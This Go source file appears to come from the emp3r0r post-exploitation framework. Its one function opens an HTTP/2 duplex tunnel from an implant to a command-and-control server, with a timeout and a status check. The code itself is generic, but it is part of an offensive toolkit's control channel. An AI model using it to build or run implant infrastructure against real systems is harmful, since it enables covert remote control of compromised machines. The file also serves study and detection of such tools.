package c2transport

import (
	"context"
	"fmt"
	"net/http"
	"time"

	"github.com/jm33-m0/emp3r0r/core/lib/logging"

	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/posener/h2conn"
)

// EstablishC2Connection connect to CC with h2conn
func EstablishC2Connection(url string) (conn *h2conn.Conn, ctx context.Context, cancel context.CancelFunc, err error) {
	// use h2conn for duplex tunnel
	ctx, cancel = context.WithCancel(context.Background())

	h2 := h2conn.Client{
		Client: def.HTTPClient,
	}
	logging.Printf("EstablishC2Connection: connecting to %s", url)

	type connectResult struct {
		conn *h2conn.Conn
		resp *http.Response
		err  error
	}
	resultChan := make(chan connectResult, 1)

	go func() {
		c, r, e := h2.Connect(ctx, url)
		resultChan <- connectResult{conn: c, resp: r, err: e}
	}()

	select {
	case res := <-resultChan:
		conn = res.conn
		resp := res.resp
		err = res.err

		if err != nil {
			err = fmt.Errorf("EstablishC2Connection: initiate h2 conn: %s", err)
			logging.Print(err)
			cancel()
			return
		}
		// Check server status code
		if resp != nil {
			if resp.StatusCode != http.StatusOK {
				err = fmt.Errorf("bad status code: %d", resp.StatusCode)
				conn = nil
				cancel()
				return
			}
		}
	case <-time.After(10 * time.Second):
		err = fmt.Errorf("EstablishC2Connection at %s failed: timeout", url)
		cancel()
		return
	}

	return
}
